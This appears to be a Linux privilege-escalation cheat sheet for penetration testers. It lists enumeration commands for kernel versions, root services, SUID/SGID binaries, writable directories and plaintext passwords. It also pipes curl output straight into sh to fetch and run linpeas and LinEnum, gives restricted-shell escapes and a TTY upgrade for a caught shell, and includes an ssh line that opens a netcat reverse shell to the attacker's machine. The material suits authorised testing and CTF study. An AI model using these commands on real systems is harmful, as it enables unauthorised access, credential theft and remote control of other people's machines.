

Enumeration is the key.
(Linux) privilege escalation is all about:

    Collect - Enumeration, more enumeration and some more enumeration.
    Process - Sort through data, analyse and prioritisation.
    Search - Know what to search for and where to find the exploit code.
    Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
    Try - Get ready for (lots of) trial and error.


Linpeas
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh


LinEnum
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh


Operating System
What's the distribution type? What version?
cat /etc/issue
cat /etc/*-release
  cat /etc/lsb-release
  cat /etc/redhat-release


What's the Kernel version? Is it 64-bit?
cat /proc/version   
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-


What can be learnt from the environmental variables?
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set


Is there a printer?
lpstat -a


Applications & Services
What services are running? Which service has which user privilege?
ps aux
ps -ef
top
cat /etc/service


Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
ps aux | grep root
ps -ef | grep root


What applications are installed? What version are they? Are they currently running?
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/


Any plain text usernames and/or passwords?
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla


What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

#find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hideany errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null


Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
find / -writable -type d 2>/dev/null     # world-writeable folders
find / -perm -222 -type d 2>/dev/null  # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders

find / -perm -o+x -type d 2>/dev/null    # world-executable folders

find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders


Any "problem" files? Word-writeable, "nobody" files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files


Preparation & Finding Exploit Code
What development tools/languages are installed/supported?
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc


How can files be uploaded?
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp


Stable shell
Spawn Interactive Shell and set env  
````
python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
echo $TERM  
stty -a  
stty raw -echo  
fg  

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
export TERM=xterm256-color  
export SHELL=bash  

stty rows \<> colums \<>  
````


Restricted bash
````
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux  
````